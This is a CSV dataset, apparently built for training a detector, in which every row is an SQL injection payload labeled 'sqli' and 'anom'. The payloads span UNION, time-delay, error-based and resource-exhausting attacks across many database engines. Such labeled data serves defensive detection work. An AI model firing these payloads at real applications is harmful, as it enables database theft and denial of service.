Query,Length,Attack,Label
-1459'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('eiet' like 'eiet,127,sqli,anom
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq",112,sqli,anom
1');if(7899=7899) select 7899 else drop function zbbp--,55,sqli,anom
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""cwat"" like ""cwat",92,sqli,anom
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""zyoo""=""zyoo",159,sqli,anom
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",140,sqli,anom
"-9762) or elt(5773=8986,8986)",29,sqli,anom
"-8773%'))) union all select 8941,8941,8941,8941,8941,8941#",58,sqli,anom
"-4233%"") or (8459=8459)*4906 and (""%""=""",39,sqli,anom
1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006,58,sqli,anom
"1%""))) union all select null,null,null,null,null,null--",55,sqli,anom
"1') union all select null,null,null,null,null,null#",51,sqli,anom
"1""))) or elt(6272=6272,sleep(5)) and (((""hxgu""=""hxgu",52,sqli,anom
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,sqli,anom
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))-- huss",206,sqli,anom
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,81,sqli,anom
1'))) rlike sleep(5) and ((('zwyx'='zwyx,40,sqli,anom
"1')) as jpxj where 6153=6153 or 8156=(select count(*) from generate_series(1,5000000))--",88,sqli,anom
"1""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",113,sqli,anom
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx",226,sqli,anom
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",170,sqli,anom
"-6112"") union all select 8203,8203,8203,8203,8203,8203,8203--",61,sqli,anom
"1"") as tqxa where 6751=6751 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",184,sqli,anom
1'));waitfor delay '0:0:5'--,28,sqli,anom
"-5391 or make_set(9354=9354,7185)# ptyy",39,sqli,anom
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",55,sqli,anom
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('ocfi'='ocfi",115,sqli,anom
"1) union all select null,null,null,null,null,null,null#",55,sqli,anom
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",112,sqli,anom
"1') where 8211=8211 union all select null,null,null,null,null#",62,sqli,anom
"1)) as ehlg where 6340=6340;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",112,sqli,anom
"1))) and 8635=(select count(*) from generate_series(1,5000000))--",65,sqli,anom
-3899') where 8152=8152 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,211,sqli,anom
"-6662"")) union all select 6755--",32,sqli,anom
"-1684""))) union all select 7473,7473#",37,sqli,anom
"1%"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",116,sqli,anom
"-7101))) union all select 4587,4587,4587,4587,4587,4587--",57,sqli,anom
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",92,sqli,anom
"-6496""))) or 1471=5278 and (((""zkoj""=""zkoj",42,sqli,anom
"-8238')) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",66,sqli,anom
1) where 3671=3671;(select * from (select(sleep(5)))srmq)--,59,sqli,anom
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('ohqs' like 'ohqs,120,sqli,anom
"1"") where 5719=5719 rlike sleep(5)--",36,sqli,anom
"1%"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""%""=""",75,sqli,anom
"1"")) and 5421=4804--",20,sqli,anom
"1"")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((""tbdl"" like ""tbdl",230,sqli,anom
"1%'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",115,sqli,anom
"1' where 4880=4880 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",176,sqli,anom
"1%"");select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",89,sqli,anom
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",90,sqli,anom
"1""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli,anom
1';select sleep(5)#,19,sqli,anom
1))) or 6793=(select 6793 from pg_sleep(5)) and (((3919=3919,60,sqli,anom
1')) as xkiq where 9008=9008 and sleep(5)--,43,sqli,anom
"1"" where 2235=2235 union all select null,null,null,null,null--",62,sqli,anom
-1219') or 5592=4835,20,sqli,anom
"1%"" and 6969=(select 6969 from pg_sleep(5)) and ""%""=""",53,sqli,anom
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",104,sqli,anom
"1') as kgnd where 1550=1550 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",90,sqli,anom
1' where 8159=8159 union all select null#,41,sqli,anom
"1) as qjjm where 3850=3850 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",198,sqli,anom
1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+',64,sqli,anom
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",89,sqli,anom
"-3924'||(select 'ssld' from dual where 6229=6229 union all select 6229,6229,6229,6229,6229#",91,sqli,anom
-8636'))) or 4301=7212--,24,sqli,anom
"1%""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""%""=""",214,sqli,anom
-7758%'))) or 3038=3038,23,sqli,anom
"1%"" rlike sleep(5) and ""%""=""",28,sqli,anom
"1%""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""%""=""",111,sqli,anom
"1%')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='",122,sqli,anom
"1' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",105,sqli,anom
"1""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",95,sqli,anom
"1"")) as sqzh where 5672=5672 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",127,sqli,anom
1') where 8128=8128;select (case when (4061=1396) then 4061 else 1/(select 0) end)--,84,sqli,anom
"-5780 or make_set(3464=4518,4518)-- icit",40,sqli,anom
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('jmjw' like 'jmjw",196,sqli,anom
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm",120,sqli,anom
"-7700%') union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",71,sqli,anom
-1127 or 7391=4954,18,sqli,anom
1' in boolean mode) and (select * from (select(sleep(5)))gcrr)#,63,sqli,anom
-8876')) or 3038=3038,21,sqli,anom
"-1218' union all select 2663,2663,2663,2663--",45,sqli,anom
-1436' or 5699=5783--,21,sqli,anom
"-9583')) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",76,sqli,anom
"-1663' or elt(1032=1032,3623) and 'yqaj' like 'yqaj",51,sqli,anom
1))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9548=9548,202,sqli,anom
"1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",93,sqli,anom
1'||(select 'tznb' from dual where 8808=8808 rlike (select * from (select(sleep(5)))vwyq)#,90,sqli,anom
"1 and make_set(8403=8403,8899)",30,sqli,anom
"1"")) as dfwi where 9703=9703 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli,anom
1) and 3861=5813--,18,sqli,anom
"-4419%"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",140,sqli,anom
"-9795) as wrgs where 5427=5427 union all select 5427,5427,5427,5427,5427,5427--",79,sqli,anom
"-4639""))) or 8550=9348",22,sqli,anom
1')));(select * from (select(sleep(5)))srmq) and ((('pfle' like 'pfle,69,sqli,anom
-3246%' union all select 4012#,30,sqli,anom
"1"") where 2088=2088 union all select null,null,null,null--",58,sqli,anom
1))) order by 1--,17,sqli,anom
"1%"") union all select null,null,null,null,null,null,null,null,null,null#",72,sqli,anom
"1'));select * from generate_series(4975,4975,case when (4975=9615) then 1 else 0 end) limit 1--",95,sqli,anom
1') rlike sleep(5) and ('qsub' like 'qsub,41,sqli,anom
"1'))) union all select null,null,null,null,null,null,null,null,null--",69,sqli,anom
-7277))) order by 1#,20,sqli,anom
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",82,sqli,anom
"1') as qqyz where 2274=2274;iif(5257=5257,1,1/0)",48,sqli,anom
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'efpc' like 'efpc",211,sqli,anom
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""uvzc"" like ""uvzc",145,sqli,anom
1'))) and 7533=7533 and ((('txex'='txex,39,sqli,anom
"1)) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",110,sqli,anom
"1%') union all select null,null,null,null,null,null,null,null,null,null#",72,sqli,anom
1;select pg_sleep(5),20,sqli,anom
"1%';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",71,sqli,anom
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('ojkd'='ojkd",111,sqli,anom
1')) as wuws where 6917=6917 union all select null#,51,sqli,anom
"1') as bxae where 4143=4143 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",120,sqli,anom
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",208,sqli,anom
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""zbwn"" like ""zbwn",86,sqli,anom
-9673) or 8571=8571--,21,sqli,anom
1);begin user_lock.sleep(5); end and (4610=4610,47,sqli,anom
"1%"" and 2006=2006",17,sqli,anom
"1%""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",113,sqli,anom
"1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj",49,sqli,anom
"1%"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",96,sqli,anom
"1'||(select 'aoad' where 8795=8795 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",177,sqli,anom
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz",225,sqli,anom
-5031' or 9323=9323#,20,sqli,anom
"-9638))) or elt(1032=1032,3623) and (((3679=3679",48,sqli,anom
"1))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6265=6265",82,sqli,anom
-7864 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# twpw,209,sqli,anom
1 rlike (select (case when (8911=5301) then 1 else 0x28 end))# pmuh,67,sqli,anom
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",98,sqli,anom
1'));select pg_sleep(5) and (('enpn' like 'enpn,47,sqli,anom
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",103,sqli,anom
"1'+(select lgkd where 7801=7801 and elt(4249=4249,7259))+'",58,sqli,anom
-4171') union all select 6136#,30,sqli,anom
"1)) as aqpy where 4027=4027 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",129,sqli,anom
1'||(select 'npdx' from dual where 9486=9486 and sleep(5))||',61,sqli,anom
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))-- sbvl",98,sqli,anom
"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((8679=8679",134,sqli,anom
"1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='",105,sqli,anom
"-5624' union all select 3723,3723,3723,3723,3723--",50,sqli,anom
"1"")));iif(1718=5436,1,1/0)",26,sqli,anom
"-9509) union all select 1193,1193,1193#",39,sqli,anom
1%') waitfor delay '0:0:5'--,28,sqli,anom
"1'))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",158,sqli,anom
"1' in boolean mode) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#",216,sqli,anom
"1"") where 8098=8098;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",103,sqli,anom
"1%')) and make_set(6527=9529,9529) and (('%'='",46,sqli,anom
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",142,sqli,anom
"1%'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",144,sqli,anom
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('fuyl'='fuyl",115,sqli,anom
"1%' or 8466=benchmark(5000000,md5(0x694a4745)) and '%'='",56,sqli,anom
-3535%'))) or 5605=4660 and ((('%'=',36,sqli,anom
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""opdl""=""opdl",117,sqli,anom
"1) as oblq where 2002=2002 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",119,sqli,anom
"1%')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",143,sqli,anom
"1""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",72,sqli,anom
"1'+(select 'ycvl' where 8415=8415 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",142,sqli,anom
"1"") or elt(6272=6272,sleep(5)) and (""dplf"" like ""dplf",53,sqli,anom
"-2605"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""cikb"" like ""cikb",228,sqli,anom
"1%"") or 8156=(select count(*) from generate_series(1,5000000))--",64,sqli,anom
"1')) union all select null,null,null,null,null,null,null,null,null,null#",72,sqli,anom
"1"") where 6065=6065 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",172,sqli,anom
1);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,86,sqli,anom
"-7551 or elt(6900=7195,7195)",28,sqli,anom
"1));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",64,sqli,anom
"1')) as vqrt where 5173=5173 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",131,sqli,anom
"-9135"")) or 6872=6872 and ((""fllx""=""fllx",40,sqli,anom
"1%""));iif(7011=2522,1,1/0)",26,sqli,anom
"1"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",87,sqli,anom
-5313'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('wkkp' like 'wkkp,220,sqli,anom
